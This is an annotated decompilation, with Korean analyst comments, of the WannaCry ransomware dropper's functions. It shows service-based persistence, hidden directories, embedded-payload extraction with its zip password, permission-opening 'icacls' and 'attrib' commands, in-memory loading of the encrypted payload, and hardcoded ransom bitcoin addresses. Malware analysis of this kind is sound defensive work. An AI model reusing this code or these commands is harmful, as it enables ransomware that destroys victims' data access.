// Combined export of all functions at 20250520_184329

// --- Metadata ---
// Function Name: c.wnryIO_401000
// Address: 0x401000
// Signature: unknown_signature
// ---------------
int __cdecl c_wnryIO_401000(void *Buffer, int a2)
{
  int v2; // esi
  FILE *v3; // eax
  FILE *v4; // edi
  size_t v6; // eax

  v2 = 0;
  if ( a2 )
    v3 = fopen("c.wnry", "rb");
  else
    v3 = fopen("c.wnry", "wb");
  v4 = v3;
  if ( !v3 )
    return 0;
  if ( a2 )
    v6 = fread(Buffer, 780u, 1u, v3);
  else
    v6 = fwrite(Buffer, 780u, 1u, v3);
  if ( v6 )
    v2 = 1;
  fclose(v4);
  return v2;
}


// --- Metadata ---
// Function Name: ExecuteProcessWithTimeout
// Address: 0x401064
// Signature: unknown_signature
// ---------------
int __cdecl ExecuteProcessWithTimeout(LPSTR lpCommandLine, DWORD dwMilliseconds, LPDWORD lpExitCode)
{
  struct _STARTUPINFOA StartupInfo; // [esp+8h] [ebp-54h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+4Ch] [ebp-10h] BYREF

  StartupInfo.cb = 68;
  memset(&StartupInfo.lpReserved, 0, 0x40u);
  ProcessInformation.hProcess = 0;
  ProcessInformation.hThread = 0;
  ProcessInformation.dwProcessId = 0;
  ProcessInformation.dwThreadId = 0;
  StartupInfo.wShowWindow = 0;
  StartupInfo.dwFlags = 1;
  if ( !CreateProcessA(0, lpCommandLine, 0, 0, 0, 0x8000000u, 0, 0, &StartupInfo, &ProcessInformation) )
    return 0;
  if ( dwMilliseconds )
  {
    if ( WaitForSingleObject(ProcessInformation.hProcess, dwMilliseconds) )
      TerminateProcess(ProcessInformation.hProcess, 0xFFFFFFFF);
    if ( lpExitCode )
      GetExitCodeProcess(ProcessInformation.hProcess, lpExitCode);
  }
  CloseHandle(ProcessInformation.hProcess);
  CloseHandle(ProcessInformation.hThread);
  return 1;
}


// --- Metadata ---
// Function Name: manageRegDir_4010FD
// Address: 0x4010FD
// Signature: unknown_signature
// ---------------
int __cdecl manageRegDir_4010FD(int a1)
{
  size_t v1; // eax
  BOOL v2; // esi
  LSTATUS v3; // eax
  CHAR Buffer; // [esp+8h] [ebp-2DCh] BYREF
  char v6[516]; // [esp+9h] [ebp-2DBh] BYREF
  __int16 v7; // [esp+20Dh] [ebp-D7h]
  char v8; // [esp+20Fh] [ebp-D5h]
  wchar_t Destination[10]; // [esp+210h] [ebp-D4h] BYREF
  char v10[180]; // [esp+224h] [ebp-C0h] BYREF
  DWORD cbData; // [esp+2D8h] [ebp-Ch] BYREF
  int v12; // [esp+2DCh] [ebp-8h]
  HKEY phkResult; // [esp+2E0h] [ebp-4h] BYREF

  qmemcpy(Destination, L"Software\\", sizeof(Destination));
  Buffer = 0;
  phkResult = 0;
  memset(v10, 0, sizeof(v10));
  memset(v6, 0, sizeof(v6));
  v7 = 0;
  v8 = 0;
  wcscat(Destination, L"WanaCrypt0r");          // 키 값 = Software\\WanaCrypt0
  v12 = 0;
  while ( 1 )
  {
    if ( v12 )
      RegCreateKeyW(HKEY_CURRENT_USER, Destination, &phkResult);// 레지스트리 경로1 = HKEY_CURRENT_USER
    else
      RegCreateKeyW(HKEY_LOCAL_MACHINE, Destination, &phkResult);// 레지스트리 경로2 = HKEY_LOCAL_MACHINE
    if ( phkResult )
    {
      if ( a1 )                                 // 인자로 1 값이 넘어옴 
      {
        GetCurrentDirectoryA(0x207u, &Buffer);  // 현재 작업 디렉토리 불러오기 
        v1 = strlen(&Buffer);
        v2 = RegSetValueExA(phkResult, "wd", 0, 1u, &Buffer, v1 + 1) == 0;// 레지스트리 키에 wd라는 이름으로 저장 
      }
      else
      {
        cbData = 519;
        v3 = RegQueryValueExA(phkResult, "wd", 0, 0, &Buffer, &cbData);
        v2 = v3 == 0;
        if ( !v3 )
          SetCurrentDirectoryA(&Buffer);
      }
      RegCloseKey(phkResult);
      if ( v2 )
        break;
    }
    if ( ++v12 >= 2 )
      return 0;
  }
  return 1;
}


// --- Metadata ---
// Function Name: generateRandomNum_401225
// Address: 0x401225
// Signature: unknown_signature
// ---------------
int __cdecl generateRandomNum_401225(int a1)
{
  unsigned int v1; // ebx
  WCHAR *v2; // edi
  size_t v3; // eax
  int v4; // edi
  int v5; // esi
  int v6; // esi
  int result; // eax
  WCHAR Buffer; // [esp+Ch] [ebp-198h] BYREF
  char buffer[396]; // [esp+Eh] [ebp-196h] BYREF
  __int16 v10; // [esp+19Ah] [ebp-Ah]
  DWORD nSize; // [esp+19Ch] [ebp-8h] BYREF
  unsigned int v12; // [esp+1A0h] [ebp-4h]

  Buffer = Null_40F874;
  nSize = 399;
  memset(buffer, 0, sizeof(buffer));
  v10 = 0;
  GetComputerNameW(&Buffer, &nSize);
  v12 = 0;
  v1 = 1;
  if ( wcslen(&Buffer) )
  {
    v2 = &Buffer;
    do
    {
      v1 *= *v2;
      ++v12;
      ++v2;
      v3 = wcslen(&Buffer);
    }
    while ( v12 < v3 );
  }
  srand(v1);                                    // 시드값 
  v4 = 0;
  v5 = rand() % 8 + 8;                          // 난수값 
  if ( v5 > 0 )
  {
    do
    {
      *(v4 + a1) = rand() % 26 + 97;            // a1은 파라미터 == Displayname
      ++v4;
    }
    while ( v4 < v5 );
  }
  v6 = v5 + 3;
  while ( v4 < v6 )
  {
    *(v4 + a1) = rand() % 10 + 48;
    ++v4;
  }
  result = a1;
  *(v4 + a1) = 0;
  return result;
}


// --- Metadata ---
// Function Name: RSAKey_struct_4012FD
// Address: 0x4012FD
// Signature: unknown_signature
// ---------------
_DWORD *__thiscall RSAKey_struct_4012FD(_DWORD *this)
{
  RSAKey_structMember1_4017DD(this + 4);
  RSAKey_structMember1_4017DD(this + 44);
  RSAKey_structMember2_402A46(this + 84);
  this[306] = 0;
  this[307] = 0;
  this[308] = 0;
  this[309] = 0;
  *this = &off_4081D8;
  return this;
}


// --- Metadata ---
// Function Name: AEScleanUp_NDC_40135E
// Address: 0x40135E
// Signature: unknown_signature
// ---------------
void *__thiscall AEScleanUp_NDC_40135E(void *this, char a2)
{
  AESKeyStruct_FinalCleanup_40137A(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}


// --- Metadata ---
// Function Name: AESKeyStruct_FinalCleanup_40137A
// Address: 0x40137A
// Signature: unknown_signature
// ---------------
void __thiscall AESKeyStruct_FinalCleanup_40137A(_DWORD *this)
{
  *this = &off_4081D8;                          // vtable 설정 
  AESKeyStruct_Release_4013CE(this);            // 리소스 해제 
  AESKeyStruct_initVtable_402A6F(this + 21);    // 하위 구조체 초기화 
  AESKeyStruct_Destructor_40181B(this + 44);    // 하위 구초제 파괴 
  AESKeyStruct_Destructor_40181B(this + 4);     // 실행 후 메모리에서 제거하고, 공개키로 암호화된 AES 키만 남김. 내부 메모리를 확실히 청소하려는 의도.
}


// --- Metadata ---
// Function Name: AESKeyStruct_Release_4013CE
// Address: 0x4013CE
// Signature: unknown_signature
// ---------------
int __thiscall AESKeyStruct_Release_4013CE(HGLOBAL *this)
{
  _BYTE *v2; // eax
  int v3; // edi
  int v4; // ecx
  _BYTE *v5; // eax

  ReleaseCryptoContext_4018B9(this + 1);        // 2개의 암호화 컨텍스트를 해제
  ReleaseCryptoContext_4018B9(this + 11);
  v2 = this[306];
  v3 = 0x100000;
  if ( v2 )                                     // 두 개의 AES 키 혹은 중요한 메모리 블록을 0으로 덮은 후 해제 (디스크에 남지 않게끔 secure delete)
  {
    v4 = 0x100000;
    do
    {
      *v2++ = 0;
      --v4;
    }
    while ( v4 );
    GlobalFree(this[306]);
    this[306] = 0;
  }
  v5 = this[307];
  if ( v5 )
  {
    do
    {
      *v5++ = 0;
      --v3;
    }
    while ( v3 );
    GlobalFree(this[307]);
    this[307] = 0;
  }
  return 1;
}


// --- Metadata ---
// Function Name: RSAKey_constructor_401437
// Address: 0x401437
// Signature: unknown_signature
// ---------------
int __thiscall RSAKey_constructor_401437(_DWORD *this, LPCSTR lpFileName, int a3, int a4)
{
  HGLOBAL v5; // eax
  HGLOBAL v6; // eax

  if ( !getRSACrpytKey_401861(this + 1, lpFileName) )
    return 0;
  if ( lpFileName )
    getRSACrpytKey_401861(this + 11, 0);
  v5 = GlobalAlloc(0, 0x100000u);
  this[306] = v5;
  if ( !v5 )
    return 0;
  v6 = GlobalAlloc(0, 0x100000u);
  this[307] = v6;
  if ( !v6 )
    return 0;
  this[309] = a3;
  this[308] = a4;
  return 1;
}


// --- Metadata ---
// Function Name: decryptWannaCrytFiles_4014A6
// Address: 0x4014A6
// Signature: unknown_signature
// ---------------
int __thiscall decryptWannaCrytFiles_4014A6(void **RSAKeyStruct, LPCSTR lpFileName, int a3)
{
  int v4; // ebx
  HANDLE v5; // edi
  size_t Size; // [esp+14h] [ebp-244h] BYREF
  int Buffer; // [esp+18h] [ebp-240h] BYREF
  char Buf1; // [esp+1Ch] [ebp-23Ch] BYREF
  int v10; // [esp+1Dh] [ebp-23Bh]
  __int16 v11; // [esp+21h] [ebp-237h]
  char v12; // [esp+23h] [ebp-235h]
  __int64 dwBytes; // [esp+24h] [ebp-234h] BYREF
  int keyvalue[128]; // [esp+2Ch] [ebp-22Ch] BYREF
  int v15; // [esp+22Ch] [ebp-2Ch] BYREF
  int v16; // [esp+230h] [ebp-28h]
  LARGE_INTEGER FileSize; // [esp+234h] [ebp-24h] BYREF
  DWORD NumberOfBytesRead; // [esp+23Ch] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+240h] [ebp-18h] BYREF

  v4 = 0;
  v15 = 0;
  Size = 0;
  Buf1 = 0;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  Buffer = 0;
  NumberOfBytesRead = 0;
  ms_exc.registration.TryLevel = 0;
  v5 = CreateFileA(lpFileName, 0x80000000, 1u, 0, 3u, 0, 0);
  if ( v5 != -1 )
  {
    GetFileSizeEx(v5, &FileSize);
    if ( FileSize.QuadPart <= 104857600 )       // 100mb 이상 파일은 무시함 
    {
      if ( ReadFile_0(v5, &Buf1, 8u, &NumberOfBytesRead, 0) )
      {
        if ( !memcmp(&Buf1, "WANACRY!", 8u) )   // 암호화된 파일 헤더에 남는 WANACRY!라는 서명 확인 
        {
          if ( ReadFile_0(v5, &Size, 4u, &NumberOfBytesRead, 0) )
          {
            if ( Size == 256 )
            {
              if ( ReadFile_0(v5, RSAKeyStruct[306], 0x100u, &NumberOfBytesRead, 0) )
              {
                if ( ReadFile_0(v5, &Buffer, 4u, &NumberOfBytesRead, 0) )
                {
                  if ( ReadFile_0(v5, &dwBytes, 8u, &NumberOfBytesRead, 0) )
                  {
                    if ( dwBytes <= 104857600 )
                    {
                      if ( decryptAESkey_4019E1((RSAKeyStruct + 1), RSAKeyStruct[306], Size, keyvalue, &v15) )// RSA 비밀키를 통해 AES키를 복호화 
                      {
                        AESKeySchedule_402A76((RSAKeyStruct + 21), keyvalue, Src, v15, 0x10u);// AES 키 초기화 작업 
                        v16 = GlobalAlloc(0, dwBytes);
                        if ( v16 )
                        {
                          if ( ReadFile_0(v5, RSAKeyStruct[306], FileSize.LowPart, &NumberOfBytesRead, 0)
                            && NumberOfBytesRead
                            && NumberOfBytesRead >= dwBytes )
                          {
                            v4 = v16;
                            AES_EncryptDecrypt_403A77((RSAKeyStruct + 21), RSAKeyStruct[306], v16, NumberOfBytesRead, 1);// 복호화 작업 
                            *a3 = dwBytes;
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  local_unwind2(&ms_exc.registration, -1);
  return v4;
}


// --- Metadata ---
// Function Name: loadWindowsAPI_40170A
// Address: 0x40170A
// Signature: unknown_signature
// ---------------
int loadWindowsAPI_40170A()
{
  HMODULE v0; // eax
  HMODULE v1; // edi
  BOOL (__stdcall *CloseHandle)(HANDLE); // eax
  int result; // eax

  if ( !InitCryptoAPI_401A45() )
    goto LABEL_12;
  if ( *CreateFileW )
    goto LABEL_11;
  v0 = LoadLibraryA("kernel32.dll");
  v1 = v0;
  if ( !v0 )
    goto LABEL_12;
  *CreateFileW = GetProcAddress(v0, "CreateFileW");
  *WriteFile_0 = GetProcAddress(v1, "WriteFile");
  *ReadFile_0 = GetProcAddress(v1, "ReadFile");
  *MoveFileW = GetProcAddress(v1, "MoveFileW");
  *MoveFileExW = GetProcAddress(v1, "MoveFileExW");
  *DeleteFileW = GetProcAddress(v1, "DeleteFileW");
  CloseHandle = GetProcAddress(v1, "CloseHandle");
  dword_40F890 = CloseHandle;
  if ( !*CreateFileW )
    goto LABEL_12;
  if ( *WriteFile_0 && *ReadFile_0 && *MoveFileW && *MoveFileExW && *DeleteFileW && CloseHandle )
LABEL_11:
    result = 1;
  else
LABEL_12:
    result = 0;
  return result;
}


// --- Metadata ---
// Function Name: RSAKey_structMember1_4017DD
// Address: 0x4017DD
// Signature: unknown_signature
// ---------------
char *__thiscall RSAKey_structMember1_4017DD(char *this)
{
  *(this + 1) = 0;
  *(this + 2) = 0;
  *(this + 3) = 0;
  *this = &off_4081EC;
  InitializeCriticalSection((this + 16));
  return this;
}


// --- Metadata ---
// Function Name: AESdestructor_NDC_4017FF
// Address: 0x4017FF
// Signature: unknown_signature
// ---------------
void *__thiscall AESdestructor_NDC_4017FF(void *this, char a2)
{
  AESKeyStruct_Destructor_40181B(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}


// --- Metadata ---
// Function Name: AESKeyStruct_Destructor_40181B
// Address: 0x40181B
// Signature: unknown_signature
// ---------------
void __thiscall AESKeyStruct_Destructor_40181B(char *this)
{
  *this = &off_4081EC;
  DeleteCriticalSection((this + 16));
}


// --- Metadata ---
// Function Name: InitializeCryptoContext_40182C
// Address: 0x40182C
// Signature: unknown_signature
// ---------------
BOOL __thiscall InitializeCryptoContext_40182C(char *this)
{
  int v1; // edi
  HCRYPTPROV *v2; // esi
  BOOL result; // eax

  v1 = 0;
  v2 = (this + 4);
  while ( 1 )
  {
    result = CryptAcquireContextA(              // Crypto API 컨텍스트 확보 
               v2,
               0,
               (v1 != 0 ? "Microsoft Enhanced RSA and AES Cryptographic Provider" : 0),
               0x18u,
               0xF0000000);
    if ( result )
      break;
    if ( ++v1 >= 2 )
      return result;
  }
  return 1;
}


// --- Metadata ---
// Function Name: getRSACrpytKey_401861
// Address: 0x401861
// Signature: unknown_signature
// ---------------
int __thiscall getRSACrpytKey_401861(int *this, LPCSTR lpFileName)
{
  if ( InitializeCryptoContext_40182C(this) )   // CSP 컨텍스트 확보 
  {
    if ( lpFileName ? ImportRSAKey_4018F9(this[1], (this + 2), lpFileName) : CryptImportKey(
                                                                               this[1],
                                                                               byte_40EBF8,
                                                                               0x494u,
                                                                               0,
                                                                               0,
                                                                               this + 2) )
      return 1;
  }
  ReleaseCryptoContext_4018B9(this);
  return 0;
}


// --- Metadata ---
// Function Name: ReleaseCryptoContext_4018B9
// Address: 0x4018B9
// Signature: unknown_signature
// ---------------
int __thiscall ReleaseCryptoContext_4018B9(_DWORD *this)
{
  HCRYPTPROV v2; // eax

  if ( this[2] )
  {
    CryptDestroyKey(this[2]);                   // 키 제거 
    this[2] = 0;
  }
  if ( this[3] )
  {
    CryptDestroyKey(this[3]);
    this[3] = 0;
  }
  v2 = this[1];
  if ( v2 )
  {
    CryptReleaseContext(v2, 0);
    this[1] = 0;
  }
  return 1;
}


// --- Metadata ---
// Function Name: ImportRSAKey_4018F9
// Address: 0x4018F9
// Signature: unknown_signature
// ---------------
int __cdecl ImportRSAKey_4018F9(int a1, int a2, LPCSTR lpFileName)
{
  int v3; // esi
  HANDLE v4; // eax
  DWORD v5; // eax
  DWORD v6; // edi
  HGLOBAL v7; // ebx
  HANDLE hFile; // [esp+Ch] [ebp-28h]
  DWORD NumberOfBytesRead; // [esp+18h] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+1Ch] [ebp-18h] BYREF

  v3 = 0;
  NumberOfBytesRead = 0;
  ms_exc.registration.TryLevel = 0;             // 외부 키 파일에서 암호화/복호화 키를 가져옴 
  v4 = CreateFileA(lpFileName, 0x80000000, 1u, 0, 3u, 0, 0);// 키 파일 열기 
  hFile = v4;
  if ( v4 != -1 )
  {
    v5 = GetFileSize(v4, 0);
    v6 = v5;
    if ( v5 != -1 && v5 <= 0x19000 )
    {
      v7 = GlobalAlloc(0, v5);
      if ( v7 )
      {                                         // CryptoAPI 키 객체 생성 
        if ( ReadFile(hFile, v7, v6, &NumberOfBytesRead, 0) && CryptImportKey(a1, v7, NumberOfBytesRead, 0, 0, a2) )
          v3 = 1;
      }
    }
  }
  local_unwind2(&ms_exc.registration, -1);
  return v3;
}


// --- Metadata ---
// Function Name: decryptAESkey_4019E1
// Address: 0x4019E1
// Signature: unknown_signature
// ---------------
int __thiscall decryptAESkey_4019E1(int RSAKeyStruct, void *encryptedSource, size_t Size, void *decryptedData, int a5)
{
  BOOL v6; // eax
  struct _RTL_CRITICAL_SECTION *v8; // [esp-4h] [ebp-Ch]

  if ( !*(RSAKeyStruct + 8) )
    return 0;
  EnterCriticalSection((RSAKeyStruct + 16));
  v6 = CryptDecrypt(*(RSAKeyStruct + 8), 0, 1, 0, encryptedSource, &Size);// 이전에 암호화된 데이터 복호화 
  v8 = (RSAKeyStruct + 16);
  if ( !v6 )
  {
    LeaveCriticalSection(v8);
    return 0;
  }
  LeaveCriticalSection(v8);
  memcpy(decryptedData, encryptedSource, Size);
  *a5 = Size;
  return 1;
}


// --- Metadata ---
// Function Name: InitCryptoAPI_401A45
// Address: 0x401A45
// Signature: unknown_signature
// ---------------
int InitCryptoAPI_401A45()
{
  HMODULE v0; // eax
  HMODULE v1; // edi
  BOOL (__stdcall *CryptGenKey)(HCRYPTPROV, ALG_ID, DWORD, HCRYPTKEY *); // eax
  int result; // eax

  if ( CryptAcquireContextA )                   // Windows Crypto API 함수 포인터들을 동적으로 로드
    goto LABEL_9;
  v0 = LoadLibraryA("advapi32.dll");
  v1 = v0;
  if ( !v0 )
    goto LABEL_10;
  CryptAcquireContextA = GetProcAddress(v0, "CryptAcquireContextA");
  CryptImportKey = GetProcAddress(v1, "CryptImportKey");
  CryptDestroyKey = GetProcAddress(v1, "CryptDestroyKey");
  *CryptEncrypt = GetProcAddress(v1, "CryptEncrypt");
  CryptDecrypt = GetProcAddress(v1, "CryptDecrypt");
  CryptGenKey = GetProcAddress(v1, "CryptGenKey");
  dword_40F8A8 = CryptGenKey;
  if ( CryptAcquireContextA && CryptImportKey && CryptDestroyKey && *CryptEncrypt && CryptDecrypt && CryptGenKey )
LABEL_9:
    result = 1;
  else
LABEL_10:
    result = 0;
  return result;
}


// --- Metadata ---
// Function Name: createDirAndHide_401AF6
// Address: 0x401AF6
// Signature: unknown_signature
// ---------------
int __cdecl createDirAndHide_401AF6(LPCWSTR lpPathName, LPCWSTR lpFileName, wchar_t *Buffer)
{
  DWORD v4; // eax

  CreateDirectoryW(lpPathName, 0);
  if ( !SetCurrentDirectoryW(lpPathName) )
    return 0;
  CreateDirectoryW(lpFileName, 0);
  if ( !SetCurrentDirectoryW(lpFileName) )
    return 0;
  v4 = GetFileAttributesW(lpFileName);
  LOBYTE(v4) = v4 | 6;
  SetFileAttributesW(lpFileName, v4);
  if ( Buffer )
    swprintf(Buffer, L"%s\\%s", lpPathName, lpFileName);
  return 1;
}


// --- Metadata ---
// Function Name: saveDataInSystemDir_401B5F
// Address: 0x401B5F
// Signature: unknown_signature
// ---------------
BOOL __cdecl saveDataInSystemDir_401B5F(wchar_t *a1)
{
  WCHAR Buffer; // [esp+8h] [ebp-4D8h] BYREF
  __int16 v3[259]; // [esp+Ah] [ebp-4D6h] BYREF
  wchar_t FileName; // [esp+210h] [ebp-2D0h] BYREF
  char v5[516]; // [esp+212h] [ebp-2CEh] BYREF
  __int16 v6; // [esp+416h] [ebp-CAh]
  WCHAR WideCharStr; // [esp+418h] [ebp-C8h] BYREF
  char v8[196]; // [esp+41Ah] [ebp-C6h] BYREF
  __int16 v9; // [esp+4DEh] [ebp-2h]

  Buffer = Null_40F874;
  memset(v3, 0, 0x204u);
  v3[258] = 0;
  FileName = Null_40F874;
  memset(v5, 0, sizeof(v5));
  v6 = 0;
  WideCharStr = Null_40F874;
  memset(v8, 0, sizeof(v8));
  v9 = 0;
  MultiByteToWideChar(0, 0, DisplayName, -1, &WideCharStr, 99);
  GetWindowsDirectoryW(&Buffer, 0x104u);
  v3[1] = 0;
  swprintf(&FileName, L"%s\\ProgramData", &Buffer);// ProgramData 디렉토리 
  if ( GetFileAttributesW(&FileName) != -1 && createDirAndHide_401AF6(&FileName, &WideCharStr, a1) )
    return 1;
  swprintf(&FileName, L"%s\\Intel", &Buffer);   // Intel 디렉토리 
  if ( createDirAndHide_401AF6(&FileName, &WideCharStr, a1) || createDirAndHide_401AF6(&Buffer, &WideCharStr, a1) )
    return 1;
  GetTempPathW(0x104u, &FileName);              // 둘 다 안되면 임시 경로 
  if ( wcsrchr(&FileName, 92u) )
    *wcsrchr(&FileName, 92u) = 0;
  return createDirAndHide_401AF6(&FileName, &WideCharStr, a1) != 0;// 인자로 받은 파일을 생성한 후 숨김 
}


// --- Metadata ---
// Function Name: StartServiceWithCmd_401CE8
// Address: 0x401CE8
// Signature: unknown_signature
// ---------------
int __cdecl StartServiceWithCmd_401CE8(const char *a1)
{
  SC_HANDLE v1; // eax
  SC_HANDLE v3; // eax
  int v4; // esi
  SC_HANDLE v5; // eax
  SC_HANDLE v6; // esi
  char Buffer[1024]; // [esp+4h] [ebp-40Ch] BYREF
  SC_HANDLE hSCObject; // [esp+404h] [ebp-Ch]
  int v9; // [esp+408h] [ebp-8h]
  SC_HANDLE hSCManager; // [esp+40Ch] [ebp-4h]

  v9 = 0;
  v1 = OpenSCManagerA(0, 0, 0xF003Fu);          // Windows 서비스 API를 사용
  hSCManager = v1;
  if ( !v1 )
    return 0;
  v3 = OpenServiceA(v1, DisplayName, 0xF01FFu); // 기존 서비스가 있는지 확인 
  hSCObject = v3;
  if ( v3 )
  {
    StartServiceA(v3, 0, 0);                    // 서비스 시작 
    CloseServiceHandle(hSCObject);
    v4 = 1;
  }
  else                                          // 기존 서비스가 없는 경우 서비스 생성 -> 서비스 형태로 코드 실행 
  {
    sprintf(Buffer, "cmd.exe /c \"%s\"", a1);
    v5 = CreateServiceA(hSCManager, DisplayName, DisplayName, 0xF01FFu, 0x10u, 2u, 1u, Buffer, 0, 0, 0, 0, 0);
    v6 = v5;
    if ( v5 )
    {
      StartServiceA(v5, 0, 0);
      CloseServiceHandle(v6);
      v9 = 1;
    }
    v4 = v9;
  }
  CloseServiceHandle(hSCManager);               // 관리자 권한에서 백그라운드 실행을 지속하거나 초기 실행을 보장
  return v4;
}


// --- Metadata ---
// Function Name: dropper_401DAB
// Address: 0x401DAB
// Signature: unknown_signature
// ---------------
int __cdecl dropper_401DAB(HMODULE hModule, char *Str)
{
  HRSRC v2; // eax
  HRSRC v3; // esi
  HGLOBAL v4; // eax
  void *v5; // edi
  int v6; // eax
  _DWORD *zipArchiveHandle; // esi
  int v9; // ebx
  char *i; // edi
  int Src; // [esp+8h] [ebp-12Ch] BYREF
  char Str1[296]; // [esp+Ch] [ebp-128h] BYREF

  v2 = FindResourceA(hModule, 0x80A, "XIA");    // 파일에 내장된 "XIA" 타입의 0x80A ID를 가진 리소스를 찾고 메모리에 로드
  v3 = v2;
  if ( !v2 )
    return 0;
  v4 = LoadResource(hModule, v2);
  if ( !v4 )
    return 0;
  v5 = LockResource(v4);
  if ( !v5 )
    return 0;
  v6 = SizeofResource(hModule, v3);
  zipArchiveHandle = OpenZipArchiveWrapper_4075AD(v5, v6, Str);
  if ( !zipArchiveHandle )
    return 0;
  Src = 0;
  memset(Str1, 0, sizeof(Str1));
  prepareZipEntry_4075C4(zipArchiveHandle, -1, &Src);// 전체 항목 수 가져오기 
  v9 = Src;
  for ( i = 0; i < v9; ++i )
  {
    prepareZipEntry_4075C4(zipArchiveHandle, i, &Src);
    if ( strcmp(Str1, "c.wnry") || GetFileAttributesA(Str1) == -1 )// "c.wnry" 파일이 존재하지 않으면 파일을 디스크로 드롭
      zipExtract_40763D(zipArchiveHandle, i, Str1);
  }
  ZipArchive_Close_407656(zipArchiveHandle);
  return 1;
}


// --- Metadata ---
// Function Name: showBitcoinAddress_401E9E
// Address: 0x401E9E
// Signature: unknown_signature
// ---------------
int showBitcoinAddress_401E9E()
{
  int result; // eax
  int v1; // eax
  char Buffer[178]; // [esp+0h] [ebp-318h] BYREF
  char Destination[602]; // [esp+B2h] [ebp-266h] BYREF
  char *BitCoinAddress[3]; // [esp+30Ch] [ebp-Ch]

  BitCoinAddress[0] = "13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94";// 하드코딩된 비트코인 주소 
  BitCoinAddress[1] = "12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw";
  BitCoinAddress[2] = "115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn";
  result = c_wnryIO_401000(Buffer, 1);
  if ( result )
  {
    v1 = rand();
    strcpy(Destination, BitCoinAddress[v1 % 3]);
    result = c_wnryIO_401000(Buffer, 0);
  }
  return result;
}


// --- Metadata ---
// Function Name: waitMutex_401EFF
// Address: 0x401EFF
// Signature: unknown_signature
// ---------------
int __cdecl waitMutex_401EFF(int maxtry)
{
  int v1; // esi
  HANDLE v2; // eax
  char Buffer[100]; // [esp+4h] [ebp-64h] BYREF

  sprintf(Buffer, "%s%d", "Global\\MsWinZonesCacheCounterMutexA", 0);// 뮤텍스 이름
  v1 = 0;
  if ( maxtry <= 0 )
    return 0;
  while ( 1 )
  {
    v2 = OpenMutexA(1048576u, 1, Buffer);       // 중복 실행 방지 혹은 선행 작업 대기 
    if ( v2 )
      break;
    Sleep(1000u);
    if ( ++v1 >= maxtry )                       // 타임 아웃 = 조건 불충분 
      return 0;
  }
  CloseHandle(v2);
  return 1;                                     // 뮤텍스 존재 -> 실행 조건 만족 
}


// --- Metadata ---
// Function Name: runTasksche_401F5D
// Address: 0x401F5D
// Signature: unknown_signature
// ---------------
BOOL runTasksche_401F5D()
{
  CHAR Buffer; // [esp+4h] [ebp-208h] BYREF
  char v2[516]; // [esp+5h] [ebp-207h] BYREF
  __int16 v3; // [esp+209h] [ebp-3h]
  char v4; // [esp+20Bh] [ebp-1h]

  Buffer = FILENAME;
  memset(v2, 0, sizeof(v2));
  v3 = 0;
  v4 = 0;
  GetFullPathNameA("tasksche.exe", 520u, &Buffer, 0);
  return StartServiceWithCmd_401CE8(&Buffer) && waitMutex_401EFF(60)
      || ExecuteProcessWithTimeout(&Buffer, 0, 0) && waitMutex_401EFF(60);
}


// --- Metadata ---
// Function Name: _WinMain@16
// Address: 0x401FE7
// Signature: unknown_signature
// ---------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  char ***v4; // eax
  void *decodedTwnryFile; // eax
  _DWORD *decodedTwnryBaseAddr; // eax
  void (__stdcall *v7)(_DWORD, _DWORD); // eax
  void *RSAKeyStruct[310]; // [esp+10h] [ebp-6E4h] BYREF
  CHAR Filename; // [esp+4E8h] [ebp-20Ch] BYREF
  char Filename_1[516]; // [esp+4E9h] [ebp-20Bh] BYREF
  __int16 v12; // [esp+6EDh] [ebp-7h]
  char v13; // [esp+6EFh] [ebp-5h]
  int decodedTwnrySize; // [esp+6F0h] [ebp-4h] BYREF

  Filename = FILENAME;
  memset(Filename_1, 0, sizeof(Filename_1));
  v12 = 0;
  v13 = 0;
  GetModuleFileNameA(0, &Filename, 520u);
  generateRandomNum_401225(DisplayName);        // 난수 생성 
  if ( *_p___argc() != 2
    || (v4 = _p___argv(), strcmp((*v4)[1], "/i"))
    || !saveDataInSystemDir_401B5F(0)           // ProgramData > Intel > Temp 중 성공하는 경로에 임시 파일 생성
    || (CopyFileA(&Filename, "tasksche.exe", 0), GetFileAttributesA("tasksche.exe") == -1)
    || !runTasksche_401F5D() )                  // Tasksche 실행 함수 
  {
    if ( strrchr(&Filename, 92) )
      *strrchr(&Filename, 92) = 0;
    SetCurrentDirectoryA(&Filename);
    manageRegDir_4010FD(1);
    dropper_401DAB(0, "WNcry@2ol7");
    showBitcoinAddress_401E9E();
    ExecuteProcessWithTimeout("attrib +h .", 0, 0);// 첫번째 인자 프로세스 실행 
    ExecuteProcessWithTimeout("icacls . /grant Everyone:F /T /C /Q", 0, 0);
    if ( loadWindowsAPI_40170A() )              // Windows API 호출 
    {
      RSAKey_struct_4012FD(RSAKeyStruct);       // RSA키 저장 구조체 
      if ( RSAKey_constructor_401437(RSAKeyStruct, 0, 0, 0) )// 외부 파일에서 RSA키를 가져옴 
      {
        decodedTwnrySize = 0;
        decodedTwnryFile = decryptWannaCrytFiles_4014A6(RSAKeyStruct, "t.wnry", &decodedTwnrySize);// AES로 암호화된 t.wnry파일을 복호화 
        if ( decodedTwnryFile )
        {
          decodedTwnryBaseAddr = LoadAndExecute_TwnryPayload_4021BD(decodedTwnryFile, decodedTwnrySize);// 복호화된 t.wnry파일을 메모리 상에서 실행 
          if ( decodedTwnryBaseAddr )
          {
            v7 = lookupPEexportTable_402924(decodedTwnryBaseAddr, "TaskStart");// PE 파일의 Export Table에서 특정 함수의 주소를 수동으로 계산 
            if ( v7 )
              v7(0, 0);
          }
        }
      }
      AESKeyStruct_FinalCleanup_40137A(RSAKeyStruct);
    }
  }
  return 0;
}


// --- Metadata ---
// Function Name: VirtualAlloc_40216E
// Address: 0x40216E
// Signature: unknown_signature
// ---------------
LPVOID __cdecl VirtualAlloc_40216E(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
{
  return VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
}


// --- Metadata ---
